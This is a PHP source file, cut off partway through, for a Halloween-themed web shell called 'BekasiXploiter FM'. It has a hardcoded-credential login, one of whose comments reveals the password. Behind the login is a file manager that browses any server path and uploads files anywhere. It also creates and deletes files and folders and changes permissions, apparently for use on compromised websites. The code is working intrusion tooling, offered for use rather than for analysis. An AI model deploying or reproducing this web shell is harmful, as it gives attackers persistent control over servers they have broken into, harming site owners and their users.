<?php
session_start();
ob_start();

// ===================== KONFIGURASI USER =====================
$HARDCODED_USERS = [
    [
        'username' => 'admin',
        
        'password_hash' => '$2a$12$nZ3I5Cl6BhuLxorLJB7XT./HDMlpEujkHbJ1IcN2jvH5IUPIPkhT6',
        'profile_pic' => 'https://tanyacoach.com/coach/logo.png'
    ],
    [
        'username' => 'userbekasi',
        // Password: "password123" - hash bcrypt
        'password_hash' => '$2a$12$nZ3I5Cl6BhuLxorLJB7XT./HDMlpEujkHbJ1IcN2jvH5IUPIPkhT6',
        'profile_pic' => 'https://tanyacoach.com/coach/logo.png'
    ]
];

// Fungsi untuk memverifikasi password
function verifyPassword($password, $hash) {
    return password_verify($password, $hash);
}

// Fungsi untuk membuat hash password (untuk setup)
function createPasswordHash($password) {
    return password_hash($password, PASSWORD_BCRYPT);
}

// Fungsi untuk mendapatkan user by username
function getUserByUsername($username) {
    global $HARDCODED_USERS;
    foreach ($HARDCODED_USERS as $user) {
        if ($user['username'] === $username) {
            return $user;
        }
    }
    return null;
}

// Cek jika user sudah login
$is_logged_in = isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;

// Handle logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header('Location: ?');
    exit;
}

// Handle login form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $user = getUserByUsername($username);
    
    if ($user && verifyPassword($password, $user['password_hash'])) {
        $_SESSION['loggedin'] = true;
        $_SESSION['username'] = $username;
        $_SESSION['profile_pic'] = $user['profile_pic'];
        header('Location: ?');
        exit;
    } else {
        $login_error = 'Username atau password salah!';
    }
}

// Redirect ke halaman login jika belum login
if (!$is_logged_in) {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - BekasiXploiter FM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d1b00 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(255, 107, 0, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(139, 0, 0, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(34, 139, 34, 0.05) 0%, transparent 50%);
            z-index: -1;
        }
        
        .login-container {
            animation: fadeIn 0.8s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .profile-img {
            width: 120px;
            height: 120px;
            border: 4px solid rgba(255, 107, 0, 0.5);
            transition: all 0.3s ease;
            filter: drop-shadow(0 0 10px rgba(255, 107, 0, 0.5));
        }
        
        .profile-img:hover {
            transform: scale(1.05) rotate(5deg);
            border-color: rgba(139, 0, 0, 0.8);
            filter: drop-shadow(0 0 15px rgba(255, 69, 0, 0.8));
        }
        
        .input-group {
            position: relative;
            margin-bottom: 1.5rem;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px 45px;
            border: 2px solid #444;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #2a2a2a;
            color: #f0e6d2;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #ff6b00;
            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.2);
            background: #333;
        }
        
        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #ff6b00;
        }
        
        .error-message {
            animation: shake 0.5s ease-in-out;
            background: linear-gradient(135deg, #8b0000 0%, #5a0000 100%);
            border: 1px solid #ff4444;
            color: #ffcc00;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        .btn-login {
            background: linear-gradient(135deg, #ff6b00 0%, #8b0000 100%);
            color: #fff;
            padding: 14px;
            border-radius: 10px;
            font-weight: 600;
            letter-spacing: 0.5px;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            position: relative;
            overflow: hidden;
        }
        
        .btn-login::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }
        
        .btn-login:hover::before {
            left: 100%;
        }
        
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 107, 0, 0.3);
            background: linear-gradient(135deg, #ff8c00 0%, #a30000 100%);
        }
        
        .btn-login:active {
            transform: translateY(0);
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { 
                box-shadow: 0 0 0 0 rgba(255, 107, 0, 0.4),
                            0 0 0 0 rgba(139, 0, 0, 0.4);
            }
            70% { 
                box-shadow: 0 0 0 10px rgba(255, 107, 0, 0),
                            0 0 0 20px rgba(139, 0, 0, 0);
            }
            100% { 
                box-shadow: 0 0 0 0 rgba(255, 107, 0, 0),
                            0 0 0 0 rgba(139, 0, 0, 0);
            }
        }
        
        .halloween-decoration {
            position: absolute;
            font-size: 24px;
            opacity: 0.3;
            animation: float 3s infinite ease-in-out;
            z-index: -1;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(10deg); }
        }
        
        .bat {
            position: absolute;
            width: 50px;
            height: 30px;
            background: #333;
            border-radius: 50%;
            animation: fly 15s linear infinite;
            opacity: 0.1;
            z-index: -1;
        }
        
        .bat::before, .bat::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 40px;
            background: #333;
            border-radius: 50%;
            top: -10px;
        }
        
        .bat::before {
            left: 5px;
            transform: rotate(-30deg);
        }
        
        .bat::after {
            right: 5px;
            transform: rotate(30deg);
        }
        
        @keyframes fly {
            0% {
                left: -50px;
                top: 10%;
            }
            100% {
                left: calc(100% + 50px);
                top: 90%;
            }
        }
        
        .spider-web {
            position: absolute;
            width: 100px;
            height: 100px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            transform: rotate(45deg);
            opacity: 0.1;
        }
        
        .spider-web::before, .spider-web::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }
        
        .spider-web::before {
            transform: rotate(45deg);
        }
        
        .spider-web::after {
            transform: rotate(90deg);
        }
        
        .glow-text {
            color: #ff6b00;
            text-shadow: 0 0 10px #ff6b00,
                         0 0 20px #ff6b00,
                         0 0 30px #ff6b00;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from {
                text-shadow: 0 0 10px #ff6b00,
                             0 0 20px #ff6b00,
                             0 0 30px #ff6b00,
                             0 0 40px #ff6b00;
            }
            to {
                text-shadow: 0 0 5px #ff6b00,
                             0 0 10px #ff6b00,
                             0 0 15px #ff6b00,
                             0 0 20px #ff6b00;
            }
        }
        
        .form-container {
            background: rgba(26, 26, 26, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 107, 0, 0.2);
            box-shadow: 0 0 30px rgba(255, 107, 0, 0.1);
        }
        
        .header-halloween {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d1b00 100%);
            border-bottom: 2px solid #ff6b00;
            position: relative;
            overflow: hidden;
        }
        
        .header-halloween::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, #ff6b00, #8b0000, #ff6b00, transparent);
            animation: shine 3s linear infinite;
        }
        
        @keyframes shine {
            0% { background-position: -200px 0; }
            100% { background-position: calc(100% + 200px) 0; }
        }
    </style>
</head>
<body>
    <!-- Halloween Decorations -->
    <div class="halloween-decoration" style="top: 10%; left: 5%;">🎃</div>
    <div class="halloween-decoration" style="top: 20%; right: 10%; animation-delay: 0.5s;">👻</div>
    <div class="halloween-decoration" style="bottom: 20%; left: 15%; animation-delay: 1s;">🕷️</div>
    <div class="halloween-decoration" style="bottom: 10%; right: 5%; animation-delay: 1.5s;">🦇</div>
    
    <!-- Bats -->
    <div class="bat" style="animation-delay: 0s;"></div>
    <div class="bat" style="animation-delay: 5s; top: 30%;"></div>
    <div class="bat" style="animation-delay: 10s; top: 70%;"></div>
    
    <!-- Spider Webs -->
    <div class="spider-web" style="top: 5%; left: 5%;"></div>
    <div class="spider-web" style="bottom: 5%; right: 5%;"></div>
    
    <div class="login-container w-full max-w-md mx-4">
        <div class="form-container rounded-2xl shadow-2xl overflow-hidden">
            <!-- Header dengan gambar profil -->
            <div class="header-halloween p-8 text-center">
                <div class="flex justify-center mb-4">
                    <img src="https://tanyacoach.com/coach/logo.png" 
                         alt="Profile" 
                         class="profile-img rounded-full shadow-lg pulse">
                </div>
                <h1 class="text-3xl font-bold glow-text mb-2">BekasiXploiter FM</h1>
                <p class="text-gray-300">Enter if you dare...</p>
            </div>
            
            <!-- Form Login -->
            <div class="p-8">
                <?php if (isset($login_error)): ?>
                <div class="error-message border border-red-800 px-4 py-3 rounded-lg mb-6 flex items-center">
                    <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>
                    </svg>
                    <?php echo htmlspecialchars($login_error); ?>
                </div>
                <?php endif; ?>
                
                <form method="POST" action="">
                    <div class="input-group">
                        <div class="input-icon">
                            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"/>
                            </svg>
                        </div>
                        <input type="text" name="username" placeholder="Enter your name..." required 
                               class="focus:ring-2 focus:ring-orange-500 focus:border-transparent placeholder-gray-500">
                    </div>
                    
                    <div class="input-group">
                        <div class="input-icon">
                            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
                            </svg>
                        </div>
                        <input type="password" name="password" placeholder="Whisper the secret..." required 
                               class="focus:ring-2 focus:ring-orange-500 focus:border-transparent placeholder-gray-500">
                    </div>
                    
                    <button type="submit" name="login" class="btn-login mt-2">
                        <span class="flex items-center justify-center">
                            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"/>
                            </svg>
                            Enter the Crypt
                        </span>
                    </button>
                </form>
                
                <div class="mt-6 pt-6 border-t border-gray-800 text-center">
                    <p class="text-gray-400 text-sm">
                        Telegram: <a href="https://www.google.com/search?q=cari+apa+bang" target="_blank" class="font-semibold text-orange-500 hover:text-orange-400 transition-colors">@aditsopojarwo1997</a>
                    </p>
                    <p class="text-gray-500 text-xs mt-2">Beware of what lurks within...</p>
                </div>
            </div>
            
            <!-- Footer -->
            <div class="bg-gray-900 px-8 py-4 text-center border-t border-gray-800">
                <p class="text-gray-500 text-sm">
                    &copy; <?php echo date('Y'); ?> <span class="text-orange-500">BekasiXploiter</span> - Halloween Edition
                </p>
                <p class="text-gray-600 text-xs mt-1">Enter at your own risk</p>
            </div>
        </div>
    </div>
    
    <script>
        // Animasi untuk input focus
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.classList.add('ring-2', 'ring-orange-500', 'ring-opacity-50');
            });
            
            input.addEventListener('blur', function() {
                this.parentElement.classList.remove('ring-2', 'ring-orange-500', 'ring-opacity-50');
            });
        });
        
        // Hapus pesan error setelah 5 detik
        setTimeout(() => {
            const errorMsg = document.querySelector('.error-message');
            if (errorMsg) {
                errorMsg.style.opacity = '0';
                errorMsg.style.transition = 'opacity 0.5s ease';
                setTimeout(() => errorMsg.remove(), 500);
            }
        }, 5000);
        
        // Efek ketik untuk placeholder
        const usernamePlaceholders = [
            "Enter your name...",
            "Who goes there?",
            "Speak your name...",
            "Identify yourself..."
        ];
        
        const passwordPlaceholders = [
            "Whisper the secret...",
            "Speak the password...",
            "Enter the magic word...",
            "Tell me the secret..."
        ];
        
        let currentUserIndex = 0;
        let currentPassIndex = 0;
        
        function typeEffect(element, text, index, callback) {
            if (index < text.length) {
                element.placeholder = text.substring(0, index + 1);
                setTimeout(() => typeEffect(element, text, index + 1, callback), 50);
            } else if (callback) {
                setTimeout(callback, 1000);
            }
        }
        
        function eraseEffect(element, text, index, callback) {
            if (index >= 0) {
                element.placeholder = text.substring(0, index);
                setTimeout(() => eraseEffect(element, text, index - 1, callback), 30);
            } else if (callback) {
                setTimeout(callback, 500);
            }
        }
        
        function cyclePlaceholders() {
            const usernameInput = document.querySelector('input[name="username"]');
            const passwordInput = document.querySelector('input[name="password"]');
            
            if (usernameInput && passwordInput && !usernameInput.matches(':focus') && !passwordInput.matches(':focus')) {
                // Cycle username placeholder
                eraseEffect(usernameInput, usernamePlaceholders[currentUserIndex], 
                          usernamePlaceholders[currentUserIndex].length, 
                          () => {
                              currentUserIndex = (currentUserIndex + 1) % usernamePlaceholders.length;
                              typeEffect(usernameInput, usernamePlaceholders[currentUserIndex], 0, null);
                          });
                
                // Cycle password placeholder
                eraseEffect(passwordInput, passwordPlaceholders[currentPassIndex], 
                          passwordPlaceholders[currentPassIndex].length,
                          () => {
                              currentPassIndex = (currentPassIndex + 1) % passwordPlaceholders.length;
                              typeEffect(passwordInput, passwordPlaceholders[currentPassIndex], 0, null);
                          });
            }
        }
        
        // Mulai efek ketik setelah 2 detik
        setTimeout(() => {
            const usernameInput = document.querySelector('input[name="username"]');
            const passwordInput = document.querySelector('input[name="password"]');
            
            if (usernameInput && passwordInput) {
                usernameInput.placeholder = "";
                passwordInput.placeholder = "";
                
                typeEffect(usernameInput, usernamePlaceholders[0], 0, () => {
                    typeEffect(passwordInput, passwordPlaceholders[0], 0, () => {
                        // Mulai siklus setelah semua teks ditampilkan
                        setInterval(cyclePlaceholders, 4000);
                    });
                });
            }
        }, 2000);
        
        // Efek hover untuk tombol login
        const loginBtn = document.querySelector('.btn-login');
        if (loginBtn) {
            loginBtn.addEventListener('mouseenter', () => {
                const emojis = ['👻', '🎃', '🕷️', '🦇', '💀', '🧙‍♂️'];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                
                const emoji = document.createElement('span');
                emoji.textContent = randomEmoji;
                emoji.style.position = 'absolute';
                emoji.style.fontSize = '20px';
                emoji.style.opacity = '0';
                emoji.style.animation = 'float 1s ease-out forwards';
                
                const x = Math.random() * loginBtn.offsetWidth;
                const y = Math.random() * loginBtn.offsetHeight;
                
                emoji.style.left = `${x}px`;
                emoji.style.top = `${y}px`;
                
                loginBtn.appendChild(emoji);
                
                setTimeout(() => {
                    emoji.remove();
                }, 1000);
            });
        }
        
        // Efek suara klik (opsional)
        document.querySelector('form').addEventListener('submit', function(e) {
            // Tambahkan efek visual saat submit
            const form = this;
            form.style.transform = 'scale(0.98)';
            setTimeout(() => {
                form.style.transform = 'scale(1)';
            }, 150);
        });
    </script>
</body>
</html>
    <?php
    exit;
}

// ===================== FILE MANAGER CODE =====================
// Lanjutkan dengan kode file manager yang sudah ada...

$path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
$file = (isset($_GET["file"])) ? $_GET["file"] : "";

$os = php_uname('s');
$separator = ($os === 'Windows') ? "\\" : "/";
$explode = explode($separator, $path);

function doFile($file, $content)
{
    if ($content == "") {
        $content = base64_encode("empty");
    } else {
        $content = base64_encode($content);
    }

    $op = fopen($file, "w");
    $write = fwrite($op, base64_decode($content));
    fclose($op);
    return ($write) ? true : false;
}

function removeFolder($folderPath)
{
    // Pastikan folder ada dan memang direktori
    if (!file_exists($folderPath) || !is_dir($folderPath)) {
        return false;
    }

    // Ambil semua isi direktori
    $items = scandir($folderPath);
    foreach ($items as $item) {
        if ($item === "." || $item === "..") {
            continue;
        }

        $itemPath = $folderPath . DIRECTORY_SEPARATOR . $item;

        // Jika direktori, panggil fungsi secara rekursif
        if (is_dir($itemPath)) {
            removeFolder($itemPath);
        } else {
            // Hapus file
            unlink($itemPath);
        }
    }

    // Hapus folder setelah isinya dihapus
    return rmdir($folderPath);
}

function chmodItem($filePath, $permissions)
{
    if (isset($_GET["file"])) {
        $item = "file";
        $name = $_GET["file"];
    } else if (isset($_GET["folder"])) {
        $item = "folder";
        $name = $_GET["folder"];
    } else {
        return false;
    }

    $chmod = chmod($filePath, octdec($permissions));

    if ($chmod) {
        $_SESSION["success"] = "Permissions changed successfully!";
        header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&" . $item . "=" . urlencode($name) . "&action=chmod$item");
        exit;
    } else {
        $_SESSION["error"] = "Failed to change permissions.";
        header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&" . $item . "=" . urlencode($name) . "&action=chmod$item");
        exit;
    }
}
?>
<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Na}{ - File Manager</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
        .user-profile {
            transition: all 0.3s ease;
        }
        
        .user-profile:hover {
            transform: scale(1.05);
        }
        
        .btn-logout {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            transition: all 0.3s ease;
        }
        
        .btn-logout:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(239, 68, 68, 0.3);
        }
        
        .header-gradient {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
    </style>
</head>

<body class="bg-gray-100 dark:bg-gray-900 text-gray-800 dark:text-gray-200">
    <?php
    if (isset($_SESSION["success"])) {
    ?>
        <div id="toast-default" class="fixed top-4 right-4 z-50 flex items-center w-full max-w-xs p-4 text-gray-500 bg-white rounded-lg shadow-lg dark:text-gray-400 dark:bg-gray-800 animate-fade-in" role="alert">
            <div class="inline-flex items-center justify-center shrink-0 w-8 h-8 text-green-500 bg-green-100 rounded-lg dark:bg-green-300 dark:text-green-200">
                <svg class="w-6 h-6 text-green-600 dark:text-green-700" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                    <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm13.707-1.293a1 1 0 0 0-1.414-1.414L11 12.586l-1.793-1.793a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.414 0l4-4Z" clip-rule="evenodd" />
                </svg>
            </div>
            <div class="ms-3 text-sm font-normal"><?= $_SESSION["success"]; ?></div>
            <button type="button" class="ms-auto -mx-1.5 -my-1.5 bg-white text-gray-400 hover:text-gray-900 rounded-lg focus:ring-2 focus:ring-gray-300 p-1.5 hover:bg-gray-100 inline-flex items-center justify-center h-8 w-8 dark:text-gray-500 dark:hover:text-white dark:bg-gray-800 dark:hover:bg-gray-700" onclick="this.parentElement.remove()">
                <span class="sr-only">Close</span>
                <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
                </svg>
            </button>
        </div>
    <?php
        unset($_SESSION["success"]);
    }

    if (isset($_SESSION["error"])) {
    ?>
        <div id="toast-error" class="fixed top-4 right-4 z-50 flex items-center w-full max-w-xs p-4 text-gray-500 bg-white rounded-lg shadow-lg dark:text-gray-400 dark:bg-gray-800 animate-fade-in" role="alert">
            <div class="inline-flex items-center justify-center shrink-0 w-8 h-8 text-red-500 bg-red-100 rounded-lg dark:bg-red-300 dark:text-red-200">
                <svg class="w-6 h-6 text-red-800 dark:text-red-700" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                    <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm7.707-3.707a1 1 0 0 0-1.414 1.414L10.586 12l-2.293 2.293a1 1 0 1 0 1.414 1.414L12 13.414l2.293 2.293a1 1 0 0 0 1.414-1.414L13.414 12l2.293-2.293a1 1 0 0 0-1.414-1.414L12 10.586 9.707 8.293Z" clip-rule="evenodd" />
                </svg>
            </div>
            <div class="ms-3 text-sm font-normal"><?= $_SESSION["error"]; ?></div>
            <button type="button" class="ms-auto -mx-1.5 -my-1.5 bg-white text-gray-400 hover:text-gray-900 rounded-lg focus:ring-2 focus:ring-gray-300 p-1.5 hover:bg-gray-100 inline-flex items-center justify-center h-8 w-8 dark:text-gray-500 dark:hover:text-white dark:bg-gray-800 dark:hover:bg-gray-700" onclick="this.parentElement.remove()">
                <span class="sr-only">Close</span>
                <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
                </svg>
            </button>
        </div>
    <?php
        unset($_SESSION["error"]);
    }
    ?>
    
    <!-- Header dengan User Info -->
    <div class="header-gradient shadow-lg">
        <div class="container mx-auto px-4 py-3">
            <div class="flex flex-col md:flex-row items-center justify-between">
                <div class="flex items-center space-x-4">
                    <a href="?" class="flex items-center space-x-3">
                        <img src="https://tanyacoach.com/coach/logo.png" class="h-16 w-auto">
                        <span class="text-white text-xl font-bold">File Manager</span>
                    </a>
                </div>
                
                <!-- User Info Section -->
                <div class="flex items-center space-x-4 mt-4 md:mt-0">
                    <div class="flex items-center space-x-3 bg-white/10 backdrop-blur-sm rounded-xl px-4 py-2">
                        <div class="relative">
                            <img src="<?= $_SESSION['profile_pic'] ?>" 
                                 alt="Profile" 
                                 class="user-profile w-10 h-10 rounded-full border-2 border-white/30">
                            <div class="absolute -bottom-1 -right-1 w-4 h-4 bg-green-500 rounded-full border-2 border-white"></div>
                        </div>
                        <div>
                            <p class="text-white font-medium"><?= htmlspecialchars($_SESSION['username']) ?></p>
                            <p class="text-blue-100 text-xs">Logged In</p>
                        </div>
                    </div>
                    
                    <a href="?action=logout" 
                       class="btn-logout text-white px-4 py-2 rounded-lg font-medium flex items-center space-x-2">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
                        </svg>
                        <span>Logout</span>
                    </a>
                </div>
            </div>
        </div>
    </div>

    <div class="container mx-auto px-4 py-6">

        <div class="flex content-center items-center flex-col md:flex-row mb-6">
            <form class="md:ms-auto max-w-lg" method="post" enctype="multipart/form-data">
                <div class="flex items-center space-x-2">
                    <input class="py-2.5 px-4 text-sm text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 w-full" type="file" name="nax">
                    <button class="text-white bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer transition-all duration-300 hover:scale-105" type="submit" name="submit">
                        Upload
                    </button>
                </div>
            </form>
        </div>

        <?php
        if (isset($_POST["submit"])) {
            $filename = basename($_FILES["nax"]["name"]);
            $tempname = $_FILES["nax"]["tmp_name"];
            $destination = $path . DIRECTORY_SEPARATOR . $filename;

            if (move_uploaded_file($tempname, $destination)) {
                $_SESSION["success"] = "File uploaded successfully!";
                header("Refresh:0; url=?path=" . urlencode($path));
                exit;
            } else {
                $_SESSION["error"] = "Upload failed!";
                header("Refresh:0; url=?path=" . urlencode($path));
                exit;
            }
        }
        ?>

        <div class="flex content-center mt-5 mb-6">
            <div class="inline-block mx-auto bg-gradient-to-r from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-700 p-4 text-sm text-center text-gray-700 dark:text-gray-300 rounded-xl shadow-inner overflow-auto w-full">
                <div class="flex items-center justify-center space-x-2">
                    <svg class="w-5 h-5 text-blue-500" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 6a1 1 0 011-1h6a1 1 0 110 2H7a1 1 0 01-1-1zm1 3a1 1 0 100 2h6a1 1 0 100-2H7z" clip-rule="evenodd"/>
                    </svg>
                    <span class="font-medium">Path:</span>
                    <?php
                    if (isset($_GET["file"]) && !isset($_GET["path"])) {
                        $path = dirname($_GET["file"]);
                    }
                    $path = str_replace("\\", "/", $path);

                    $paths = explode("/", $path);
                    echo (!preg_match("/Windows/", $os)) ? "<a class='hover:text-blue-600 dark:hover:text-blue-400 font-semibold' id='dir' href='?path=/'>~</a>" : "";
                    foreach ($paths as $id => $pat) {
                        if ($pat === '') continue;
                        echo "<span class='text-gray-400 mx-1'>/</span><a class='hover:text-blue-600 dark:hover:text-blue-400 transition-colors' href='?path=";
                        for ($i = 0; $i <= $id; $i++) {
                            echo $paths[$i];
                            if ($i != $id) {
                                echo "/";
                            }
                        }
                        echo "'>$pat</a>";
                    }
                    ?>
                </div>
            </div>
        </div>

        <?php
        if (isset($_GET["path"]) && @$_GET["action"] === "newfile") {
        ?>
            <form method="post" action="">
                <div class='mt-4 bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6'>
                    <div class="mb-4">
                        <label for="file_name" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">New File Name:</label>
                        <input type="text" id="file_name" name="file_name" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 transition-all duration-300" required>
                    </div>
                    <div>
                        <label for="file_content" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">File Content:</label>
                        <textarea id="file_content" name="file_content" rows="12" class="block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 transition-all duration-300 font-mono"></textarea>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center cursor-pointer transition-all duration-300 hover:scale-105" type="submit" name="newfile">
                            Create File
                        </button>
                    </div>
                </div>
            </form>
            <?php
            if (isset($_POST["newfile"])) {
                $fileName = trim($_POST["file_name"]);
                $filePath = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $fileName;

                if ($fileName !== "" && !file_exists($filePath)) {
                    if (doFile($filePath, "")) {
                        $_SESSION["success"] = "File created successfully!";
                        header("Refresh:0; url=?path=" . urlencode($path));
                        exit;
                    } else {
                        $_SESSION["error"] = "Failed to create file.";
                        header("Refresh:0; url=?path=" . urlencode($path));
                        exit;
                    }
                } else {
                    $_SESSION["error"] = "File already exists or invalid name.";
                    header("Refresh:0; url=?path=" . urlencode($path));
                    exit;
                }
            }
        }

        if (isset($_GET["path"]) && @$_GET["action"] === "newfolder") {
            ?>
            <form method="post" action="">
                <div class='mt-4 bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6'>
                    <label for="folder_name" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">New Folder Name:</label>
                    <input type="text" id="folder_name" name="folder_name" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 transition-all duration-300" required>
